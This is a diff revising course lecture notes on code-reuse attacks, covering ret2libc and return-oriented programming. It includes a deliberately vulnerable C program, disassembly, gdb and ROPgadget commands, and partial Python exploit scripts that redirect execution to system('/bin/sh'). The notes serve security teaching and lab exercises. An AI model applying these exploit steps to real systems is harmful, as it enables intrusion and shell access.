@@ -10,41 +10,41 @@ challenges: heap1 heap2 heap3 stack4 stack5 stack6
 Up until now we've been focusing on a specific class of attacks: **code
 injection**. In these attacks, the attacker injects their own code into a
 vulnerable program and then hijacks the control flow of the program and
-execute that injected code. 
+executes that injected code. 
 
 We've also talked about a number of automated ways to defend against such
 attacks. ("automated" here means that the defense can be implemented without
 any changes to the source code). First, we can make it harder to leverage a
-buffer overflow to hijack the control flow (e.g., by using stack canaries to
-protect the return address saved on the stack or using the DieHard memory
-allocator to protect heap metadata). Second, we've discussed how memory
-permissions can make it impossible to execute any code on the stack.
-Specifically, by following a simple invariant: memory that is writable cannot
-be executed and memory that is executable cannot be writeable. Often this type
-of defense is called the **NX bit** or **data execution prevention (DEP)**,
-depending on the specific implementation.  For this lecture we are going to
-focus on bypassing the second defense using **code reuse** attacks. 
+buffer overflow to hijack the control flow, e.g., by using stack canaries to
+protect the return address saved on the stack or ASLR to randomize the location
+of objects in memory. Second, we've discussed how memory permissions can make
+it impossible to execute any code on the stack.  Specifically, by following a
+simple invariant: memory that is writable cannot be executed and memory that is
+executable cannot be writeable. Often this type of defense is called 
+**setting the NX bit** or **data execution prevention (DEP)**, depending on the
+specific implementation.  For this lecture we are going to focus on bypassing
+restrictions on writable memory execution using **code reuse** attacks. 
 
 With DEP, there is no location in memory that an attacker can both modify and
 execute.  Consequently, data injected by the attacker (e.g., shellcode) will
 always be treated as data (i.e., not as code). Fortunately (if you like
 breaking software), there is a simple solution to this problem (simple in
-concept, but devilishly hard to implement in many situations): *reuse code that
-is already in the program.*
+concept, but tricky to implement in many situations): *reuse code that
+is already in the binary.*
 
 Below we introduce the two most basic code-reuse attacks: **return-to-libc**
 and **return-oriented programming**. 
 
 ### Return-to-libc (ret2libc)
 
-Return-to-libc is a code reuse attack that leverages functions that are in the
-libraries that are commonly used in applications (e.g., libc). A particularly
-useful function is `system()`. The behavior of `system()` is actually 
-similar to basic shellcode we learned about previously: `system()` will create a
-child process and execute the shell command specified by the arguments.  
+Return-to-libc is a code reuse attack that redirect control flow to execute
+useful functions that are in commonly-used libraries (e.g., libc). A
+particularly useful function is `system()`. The behavior of `system()` is
+actually similar to basic shellcode: `system()` will create a child process and
+execute the shell command specified by the arguments.  
 
-Let's take a look at how system works by writing a simple program and looking
-at the disassembly. 
+Let's take a look at how a call to `system()` works in a 32-bit binary by
+writing a simple program:
 
 ```
 // Note: we can compile a 32-bit binary on a 64-bit system using: 
@@ -60,29 +60,43 @@ void main() {
 
 ```
 
-By looking at the disassembly of the `main` function, we can get a sense of how
-the `system()` function is called. In particular, we can immediately see that
-the address of the command string ("echo peanut") is pushed to the stack
-immediately before the `call` instruction.  We know from our discussion of
-32-bit calling conventions that this is the argument to `system`. A quick gdb
-command shows us that we are right: `x/s 0x804851c`
+```
++pwndbg> disass *main
+Dump of assembler code for function main:
+   0x0804840b <+0>:	  push   ebp
+   0x0804840c <+1>:	  mov    ebp,esp
+   0x0804840e <+3>:	  push   0x80484b0
+   0x08048413 <+8>:	  call   0x80482e0 <system@plt>
+   0x08048418 <+13>:	add    esp,0x4
+   0x0804841b <+16>:	mov    eax,0x0
+   0x08048420 <+21>:	leave
+   0x08048421 <+22>:	ret
+End of assembler dump.
+
+```
 
 
-This calling convention should be famaliar to us by now. What you might not
+By looking at the disassembly of `main()`,  we see the address of the
+command string ("echo peanut") is pushed to the stack immediately before the
+`call` instruction.  We know from our discussion of 32-bit calling conventions
+that this is the argument to `system`. A quick gdb command shows us that we are
+right: `x/s 0x80484b0`. 
+
+
+This calling convention should be familiar to us by now. What you might not
 remember is that the `call` instruction will implicitly push the return address
 (i.e., the address of the next instruction in `main`) on to the stack. Thus,
 when we manually call `system`---during our ret2libc attack---we have to set up
 the stack to include both the correct arguments and the pushed return address.
 For this simple example, we don't really care what value we use for the return
 address, but setting this value could be useful for chaining together calls to
-libc. (Later on ask me how it is possible to use this behavior to bypass
-coarse-grained CFI. )
+libc functions. 
 
-Let's draw out what the stack looks like the moment `system()` starts executing,
-i.e., how the stack should look for our ret2libc attack to work. 
+Let's draw out what the stack looks like the moment `system()` starts
+executing, i.e., how the stack should look for our ret2libc attack to work. 
 
 ```
-Note: Stack grow to the left, higher addresses to the left.
+Note: Stack grows to the left, higher addresses to the right.
 Arg: the address of the command string
 ret: the saved return address
 
@@ -98,21 +112,21 @@ Top of the stack when system function starts executing.
 ```
 
 
-Know that we know how a normal 32-bit program calls system, we can see what
-would be required for our ret2libc attack. To execute an attack using system(),
-the attacker needs to:
+Using our observation of how our simple test program calls system, we
+can list the basic steps that are needed for a ret2libc attack using `system()`:
  1. find where the code for `system()` lives in memory,
- 2. set up the stack (and registers for 64-bit binaries) with the proper
+ 2. set up the stack (and/or registers for 64-bit binaries) with the proper
     arguments and a dummy return address, and 
  3. hijack the control-flow of the program to execute the desired function. 
-  
-## Our first ret2libc attack
+ 
+ 
+### Our First ret2libc Exploit 
 
-Let's try to apply our knowledge to the canonical vulnerable program.
+Let's try to apply our knowledge to a simple vulnerable program.
 
 ```c
 // File: vuln.c 
-// gcc -o vuln32 vuln.c -m32 -fno-stack-protector
+// gcc -o vuln vuln.c -m32 -fno-stack-protector
 #include <stdlib.h>
 #include <stdio.h>
 
@@ -123,27 +137,44 @@ void main() {
 }
 ```
 
-This program does something strange with the stack pointer: before the return
-instruction the prologue sets the stack pointer based on a value saved inside
-the current stack frame---the compiler does this for alignment reasons. As a
-result, we aren't going to overwrite the saved return address, instead, we are
-going to manipulate the value used to set the stack pointer, e.g., instructions
-`*main+33 to +40`:
-
-```asm
-   # main
-   0x0804842c <+33>:    mov    ecx,DWORD PTR [ebp-0x4]
-   0x0804842f <+36>:    leave
-   0x08048430 <+37>:    lea    esp,[ecx-0x4]
-=> 0x08048433 <+40>:    ret
 ```
++pwndbg> disass *main
+Dump of assembler code for function main:
+   0x0804840b <+0>:	lea    ecx,[esp+0x4]
+   0x0804840f <+4>:	and    esp,0xfffffff0
+   0x08048412 <+7>:	push   DWORD PTR [ecx-0x4]
+   0x08048415 <+10>:	push   ebp
+   0x08048416 <+11>:	mov    ebp,esp
+   0x08048418 <+13>:	push   ecx
+   0x08048419 <+14>:	sub    esp,0x44
+   0x0804841c <+17>:	sub    esp,0xc
+   0x0804841f <+20>:	lea    eax,[ebp-0x48]
+   0x08048422 <+23>:	push   eax
+   0x08048423 <+24>:	call   0x80482e0 <gets@plt>
+   0x08048428 <+29>:	add    esp,0x10
+   0x0804842b <+32>:	mov    eax,0x0
+   0x08048430 <+37>:	mov    ecx,DWORD PTR [ebp-0x4]
+   0x08048433 <+40>:	leave
+   0x08048434 <+41>:	lea    esp,[ecx-0x4]
+   0x08048437 <+44>:	ret
+End of assembler dump.
+```
+
+The added complication here is that our compiler inserted some instructions
+(from `*main+0 to +7`) to properly align the stack and this complicates our
+exploit; note, we could avoid this problem if we had compiled with the flag
+`-mpreferred-stack-boundary=2`.  Before the return instruction the prologue
+sets the stack pointer based on a value saved inside the current stack frame.
+As a result, we aren't going to overwrite the saved return address, instead, we
+are going to manipulate the value used to set the stack pointer, e.g.,
+instructions `*main+37 to +44`.
 
 By placing break points in gdb, we can get the starting address of the
 vulnerable buffer (`b *main+24`) and the location used to set the stack pointer
 (`b *main+33`). We want to modify the value at the saved stack pointer location
 to that the stack pointer will instead point to the start of our vulnerable
 buffer. This will allow us to control the return address used by the  `ret` 
-instruction. Of course, we want this return address to be `system`.
+instruction. We want this return address to be `system`.
 
 ```python
 # file: exploit32a.py
@@ -161,20 +192,19 @@ padding = 'a'*padding_len
 sys.stdout.write(padding + struct.pack("<I", buff_addr + 4) )
 ```
 
-
 It is not enough to manipulate the stack pointer to point to point at a
 location we control (i.e., the vulnerable buffer). We also need to make sure
-that the new top of the stack is setup to look like what the system  function
-would expect when called.
+that the new top of the stack is setup how system function is expecting (e.g.,
+with the appropriate arguments).
 
 The address of system is easy to find with a gdb command: `x system`, and the
 dummy return address can be anything. But how do we get setup the command
 argument? Specifically, we need the address of useful command string. We could
 include such a string on the stack, either by putting in our vulnerable buffer
 or throwing it in an environment variable, but we are going to take a different
-approach that use an address that is easier to predict. The solution is to find
-an existing command string in libc: "/bin/sh".
-
+approach that uses a string at an address that is easier to predict. Specifically, 
+we want to find an existing string in libc; turn out the string "/bin/sh"
+already exists in the libc code.
 
 **Finding the "/bin/sh" string in libc.** First we find what version of libc is
 loaded, where it is loaded in memory, and where the .SO file is on disk using
@@ -183,9 +213,7 @@ the .SO file with `strings -a -tx /lib/i386-linux-gnu/libc-2.23.so | grep
 /bin/sh`. We can add the offset of this string in the .SO file to the address
 of libc in the process to get the actual address of the string.
 
-
-At this point we know how to setup the stack properly for a call to system, so
-putting it all together we have our full attack:
+Putting it all together we have our full attack:
 
 ```python
 
@@ -236,16 +264,16 @@ Like before, we are going to reuse code that is already in the program. So
 first we find the address of system using gdb: `p &system`.
 
 Here's the new bit. Now we want to find **gadgets** to that will do the work of
-loading `rdi` for us.  In their simplest form, gadgets are a short sequence of
+loading `rdi` for us.  In its simplest form, a gadget is a short sequence of
 instructions ending in a return.  This technique is often called
 **return-oriented programming**.
 
-What we need is a gadget that will load a
-value from the stack (because we can control the stack) into the correct
-argument register (`rdi`).  Finding these gadgets is an art and often involves
-some manual checking. For instance, we can use objdump to look at all of the
-instructions until we find a useful gadget.  Fortunately, there are programs
-that make searching for gadgets easier. 
+What we need is a gadget that will load a value from the stack (because we can
+control what values are placed stack) into the correct argument register
+(`rdi`).  Finding these gadgets is an art and often involves some manual
+checking. For instance, we can use objdump to look at all of the instructions
+until we find a useful gadget.  Fortunately, there are programs already
+installed in EpicTreasure that make searching for gadgets easier. 
 
 ```
 ROPgadget --binary vuln64 | grep "pop rdi"
@@ -265,7 +293,6 @@ string "/bin/sh". We could do it the way we did previously (using strings and
 grep on the .SO file), but let's do it directly in GDB this time: `find
 &system,+9999999,"/bin/sh"`. Note, the program needs to be running for this
 command to work.
-
 
 Putting everything together, we have an attack that looks very similar to how
 we exploited the 32-bit binary. The big different is that added the additional
@@ -291,7 +318,8 @@ sys.stdout.write('a'*padding_len+struct.pack("<Q", gadget_addr) + struct.pack("<
 
 We got lucky in this case because we only needed to use a single gadget to set
 up our register. In many cases, we may have to string together multiple gadgets
-into a single **ROP chain** to achieve the desired results---for example, if we
-need to setup two argument registers.
+into a single **ROP chain** to achieve the desired results---for example,
+imagine what we'd need to do if we are calling a function that requires
+multiple arguments.
 
 
